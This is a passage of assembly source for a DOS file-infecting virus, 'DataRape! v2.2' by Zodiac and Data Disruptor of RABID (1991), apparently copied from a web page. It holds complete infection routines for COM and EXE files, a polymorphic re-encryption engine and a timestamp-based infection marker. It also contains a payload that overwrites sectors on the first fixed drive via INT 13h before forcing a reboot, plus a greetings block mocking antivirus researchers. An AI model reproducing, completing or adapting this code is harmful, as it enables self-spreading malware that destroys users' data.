	     push       si
	     push       di
	     push       ax
	     push       bx
	     push       cx
	     push       dx
	     xor        cx,cx
	     mov        ax,4300h
	     call       function
	     mov        bx,cx
	     and        cl,0feh
	     cmp        cl,bl
	     je         dont_change
	     mov        ax,4301h
	     call       function
	     stc
dont_change:
	     pushf
	     push       ds
	     push       dx
	     push       bx
	     mov        ax,3d02h
	     call       function
	     jc         cant_open
	     mov        bx,ax
	     call       disease
	     mov        ah,3eh

	     call       function
cant_open:
	     pop        cx
	     pop        dx
	     pop        ds
	     popf
	     jnc        no_update
	     mov        ax,4301h
	     call       function
no_update:
	     pop        dx
	     pop        cx
	     pop        bx
	     pop        ax
	     pop        di
	     pop        si
	     pop        es
	     pop        ds
	     ret
      
disease:
	     push       cs
	     pop        ds
	     push       cs
	     pop        es
	     mov        dx,offset top_save
	     mov        cx,18h
	     mov        ah,3fh
	     int        21h
	     xor        cx,cx
	     xor        dx,dx
	     mov        ax,4202h
	     int        21h
	     mov        word ptr [top_save+1ah],dx
	     cmp        ax,offset top_file
	     sbb        dx,0
	     jc         stop_infect
	     mov        word ptr [top_save+18h],ax

	     mov        ax,5700h
	     int        21h                             ; Check if Infected
	     and        cx,1Fh
	     cmp        cx,1Fh
	     je         stop_infect
	     xor        cx,cx
	     xor        dx,dx
	     mov        ax,4202h
	     int        21h
	     cmp        word ptr [top_save],5a4dh
	     je         fuck_exe
	     add        ax,offset aux_size+200h
	     adc        dx,0
	     je         fuck_it
stop_infect: ret
      
fuck_exe:
	     mov        dx,word ptr [top_save+18h]
	     neg        dl
	     and        dx,0fh
	     xor        cx,cx
	     mov        ax,4201h
	     int        21h
	     mov        word ptr [top_save+18h],ax
	     mov        word ptr [top_save+1ah],dx
fuck_it:
	     mov        ax,5700h
	     int        21h
	     pushf
	     push       cx
	     push       dx
	     cmp        word ptr [top_save],5a4dh
	     je         exe_file
	     mov        ax,100h
	     jmp        short set_adr
exe_file:
	     mov        ax,word ptr [top_save+14h]
	     mov        dx,word ptr [top_save+16h]
set_adr:
	     mov        di,offset call_adr
	     stosw
	     mov        ax,dx
	     stosw
	     mov        ax,word ptr [top_save+10h]
	     stosw
	     mov        ax,word ptr [top_save+0eh]
	     stosw
	     mov        si,offset top_save
	     movsb
	     movsw

copy_body:
	     xor        si,si
	     mov        di,offset body
	     mov        cx,offset top_file
	     rep        movsb                           ; Copies virus
							; body to buffer

enc_body:    mov        si,offset body
	     mov        di,si

;**************************
;* CHANGE ENCRYPTION BASE *
;**************************
 
	     mov        ah,2Ch                  ;Get system time
	     int        21h
	     mov        byte ptr [enc_base_1],dl
	     mov        byte ptr [body-v+enc_base_2],dl

;****************************
;* CHANGE ENCRYPTION METHOD *
;****************************

	     call       yes_no
	     jc         ror_rol
rol_ror:     mov        ax,0C0C8h
	     jmp        short set_method
ror_rol:     mov        ax,0C8C0h
set_method:  mov        byte ptr [enc_meth_1],ah
	     mov        byte ptr [body-v+enc_meth_2],al

;*******************************
;* FLIP SOME REGISTERS, PART 1 *
;*******************************

	     call       yes_no
	     jc         es_ds
ds_es:       mov        ax,1F07h
	     jmp        short set_pops
es_ds:       mov        ax,071Fh
set_pops:    mov        byte ptr [body-v+pop_1],ah
	     mov        byte ptr [body-v+pop_2],al

;*******************************
;* FLIP SOME REGISTERS, PART 2 *
;*******************************

;---
; Zodiac has informed me that there is an error in the following routine
; he has advised me to coment it out until he fixes the bug
;---

;	call       yes_no
;	jc         di_di_si
;si_si_di:
;	mov        ax,5EEEh
;	mov        dl,0F7h
;	jmp        short set_switch
;di_di_si:
;	mov        ax,5FEFh
;	mov        dl,0FEh
;set_switch: 
;	mov        byte ptr [switch_1],ah
;	mov        byte ptr [switch_2],al
;	mov        byte ptr [switch_3],dl

;*******************************
;* FLIP SOME REGISTERS, PART 3 *
;*******************************

	     mov        al,56h
	     call       yes_no
	     jc         set_push
	     inc        al
set_push:    mov        byte ptr [push_1],al

;*******************************
;* FLIP SOME REGISTERS, PART 4 *
;*******************************

	     call       yes_no
	     jc         set_dl
set_dh:      mov        ax,0B6F1h
	     mov        dl,0C6h
	     jmp        short set_inc
set_dl:      mov        ax,0B2D1h
	     mov        dl,0C2h
set_inc:     mov        byte ptr [inc_1],ah
	     mov        byte ptr [inc_2],al
	     mov        byte ptr [inc_3],dl

;*******************************
;* FLIP SOME REGISTERS, PART 5 *
;*******************************

	     call       yes_no
	     jc         ds_ax
ax_ds:       mov        ax,1E50h
	     mov        dx,581Fh
	     jmp        short set_push_2
ds_ax:       mov        ax,501Eh
	     mov        dx,1F58h
set_push_2:  mov        word ptr [push_2_1],ax
	     mov        word ptr [push_2_2],dx

	     db         0B2h
enc_base_1:  db         00h                             ; General ENC Base

	     mov        cx,offset un_enc

enc_loop:    lodsb
	     push       cx
	     mov        cl,dl
	     inc        dl
;---
; What is the meaning of this???
;---

	     db         0D2h
enc_meth_1:  db         0C0h
	     pop        cx
	     stosb
	     loop       enc_loop                        ; Encrypto

	     mov        dx,offset body
	     mov        cx,offset top_file
	     mov        ah,40h
	     int        21h                             ; Write Body

	     jc         go_no_fuck
	     xor        cx,ax
	     jnz        go_no_fuck
	     mov        dx,cx
	     mov        ax,4200h
	     int        21h
	     cmp        word ptr [top_save],5a4dh
	     je         do_exe
	     mov        byte ptr [top_save],0e9h
	     mov        ax,word ptr [top_save+18h]

;****** Below Sets the JMP so to go to the Unencryption Portion of the Virus
;****** This Doesn't happen when this is first compiled, an infection
;****** Needs to occur
	     
	     add        ax,un_enc-v-3

;******
	     
	     mov        word ptr [top_save+1],ax
	     mov        cx,3
	     jmp        short write_header
go_no_fuck:
	     jmp        short no_fuck_boost

yes_no:      push       ax
	     mov        ah,2Ch                  ;Get system time
	     int        21h
	     pop        ax                      ;Save AX
	     test       dl,1                    ;Are the 100ths of seconds 1
	     jpe        set_yes                 ;If parity is equal, SET_YES
set_no:      clc                                ;Clear carry flag
	     ret
set_yes:     stc                                ;Set carry flag
	     ret
             jmp        do_exe

no_fuck_boost:
              jmp       no_fuck

;---
; Construct the    .EXE file's header
;---    
  
do_exe:
	     mov        ax,word ptr [top_save+8]
	     call       mul_16
     
	     not        ax
	     not        dx
	     inc        ax
	     jne        calc_offs
	     inc        dx
calc_offs:
	     add        ax,word ptr [top_save+18h]
	     adc        dx,word ptr [top_save+1ah]
	     mov        cx,10h
	     div        cx

;****** Below Sets the Calling Address to the Unencryption Portion of the
;****** Virus This Doesn't happen when this is first compiled, an infection
;****** Needs to occur
	     
	     mov        word ptr [top_save+14h],un_enc-v

;******
	     mov        word ptr [top_save+16h],ax
	     add        ax,(offset top_file-offset v-1)/16+1
	     mov        word ptr [top_save+0eh],ax
	     mov        word ptr [top_save+10h],100h
	     add        word ptr [top_save+18h],offset top_file
	     adc        word ptr [top_save+1ah],0
	     mov        ax,word ptr [top_save+18h]
	     and        ax,1ffh
	     mov        word ptr [top_save+2],ax
	     pushf
	     mov        ax,word ptr [top_save+19h]
	     shr        byte ptr [top_save+1bh],1
	     rcr        ax,1
	     popf
	     jz         update_len
	     inc        ax
update_len:
	     mov        word ptr [top_save+4],ax
	     mov        cx,18h
write_header:
	     mov        dx,offset top_save
	     mov        ah,40h
	     int        21h
	     pop       dx
	     pop       cx
	     and       cx,0FFE0h
	     or        cx,1Fh
	     jmp       short time_got                   ; Mark Time Stamp

db	13,10,"Free Flash Force!!!",13,10

no_fuck:
	     pop        dx
	     pop        cx
time_got:    popf
	     jc         stop_fuck
	     mov        ax,5701h
	     int        21h
stop_fuck:
	     ret
      
alloc:
	     push       ds
	     call       get_chain
	     mov        byte ptr ds:[0],'M'
	     pop        ds
	     ret
     
get_chain:
	     push       ax
	     push       bx
	     mov        ah,62h
	     call       function
	     mov        ax,cs
	     dec        ax
	     dec        bx
next_blk:
	     mov        ds,bx
	     stc
	     adc        bx,ds:[3]
	     cmp        bx,ax
	     jc         next_blk
	     pop        bx
	     pop        ax
	     ret
      
mul_16:
	     mov        dx,10h
	     mul        dx
	     ret

kill:   call    kill_rel

kill_rel:
	pop     si
	jmp	write_short

re_do:
	mov     byte ptr [sector],1             ; Reset sector count to 1
	inc     byte ptr [track]                ; Increment next track
	jmp     fuck_drive                      ; Fuck it...

;---
; This routine is very nasty!!!
;---

write_short:
	push	cs
	pop	ds
	cmp     byte ptr [track],40
	jae     reboot
	cmp     byte ptr [sector],9
	ja      re_do

fuck_drive:
	mov     ah,03h                          ; Write disk sectors
	mov     al,9                            ; Xfer 9 sectors
	mov     bx,offset header                ; Set for buffer
	mov     ch,byte ptr [track]             ; Set for track [track]
	mov     cl,byte ptr [sector]            ; Set for sector [sector]
	mov     dh,0                            ; Set for head 0
	mov     dl,2                            ; Set for first fixed drive

	int     13h

	inc     byte ptr [sector]
	jmp     write_short

;---
; This code will cold boot the CPU with a memory check
;---

reboot:
	mov	ax,0040h
	mov	ds,ax
	mov	ax,07f7fh
	mov	ds:[0072],ax
db	0eah,00h,00h,0ffh,0ffh			; JMP FFFF:0000

header	db	"------------------",13,10
	db      "  DataRape! v2.2  ",13,10
	db      "    By Zodiac     ",13,10
	db      "and Data Disruptor",13,10
        db      "                  ",13,10
	db	"  (c) 1991 RABID  ",13,10
        db      "Int'nl Development",13,10
        db      "       Corp.      ",13,10
	db	"------------------",13,10

greetings db     13,10
         db     "Greetings to The Dark Avenger, Tudor Todorov, Patricia Hoffman",13,10
         db     "(Get your articles correct for a change... Maybe we should write",13,10
         db     "for you...), John McAfee (Who wouldn't be where he is today if it",13,10
         db     "were not for people like us...), PCM2 (Get your ass back in gear dude!)",13,10
         db     "ProTurbo, MadMan, Rick Dangerous, Elrond Halfelven, The Highwayman,",13,10
         db     "Optical Illusion, The (Real) Gunslinger, Patricia (SMOOCH), The GateKeeper,",13,10
         db     "Sledge Hammer (Let's hope you don't get hit by this one 3 times), Delko,",13,10
         db     "Paul 'Jougensen' & Mike 'Hunt' (And whoever else was there to see Chris & Cosy)",13,10
         db     "the entire Bulgarian virus factory, and any others whom we may have missed...",13,10
         db     " Remember: Winners don't use drugs! Someone card me a lifesign though...",13,10
         db     13,10
         db     "(c) 1991 The RABID International Development Corp."

call_adr:
	     dd         100h
stack_pointer:
	     dd         0
my_save:
	     int        20h
	     nop

;**** UnEncryption Below

un_enc:      call       enc_rel
enc_rel:     pop        si
rel_sub:     sub        si,offset enc_rel

;---
; Note: These are the only bytes which are constant throughout any infection
;---

rel_copy:    mov        di,si

push_1:      push       si

push_2_1:    push       ax
	     push       ds
	     push       es

	     push       cs
pop_1:       pop        ds;-

	     push       cs
pop_2:       pop        es;-

;---
; The constant bytes end here. (There are only 10 bytes...)
;---
inc_1:       db         0B2h

enc_base_2:  db         00h
	     mov        cx,offset un_enc
un_enc_loop: lodsb
	     push       cx
	     db         88h
inc_2:       db         0D1h

	     db         0D2h
enc_meth_2:  db         0C8h

	     db         0FEh
inc_3:       db         0C2h
	     pop        cx
	     stosb
	     loop       un_enc_loop

	     pop        es
push_2_2:    pop        ds
	     pop        ax
	     ret

sector  db      1			; Count of sectors that have been fried
track   db      0			; Count of tracks that have been fried

top_file:
save_int_21  equ        $
save_int_27  equ        save_int_21+4
filehndl     equ        save_int_27+4
filename     equ        filehndl+2
aux_size     equ        filename+65
top_save     equ        filename+65
body         equ        top_save+1Ch
top_bz       equ        top_save-v
my_bz        equ        top_file-v
switch_1     equ        enc_rel
switch_2     equ        rel_sub+1
switch_3     equ        rel_copy+1

;dta          equ        aux_size
; dta_attr    equ        dta+21
; dta_time    equ        dta+22
; dta_date    equ        dta+24
; dta_size_lo equ        dta+26
; dta_size_hi equ        dta+28
; dta_name    equ        dta+30
;

code    ends
	     end

;--
; End of virus
;--

</textarea></td></tr></table></body></html>
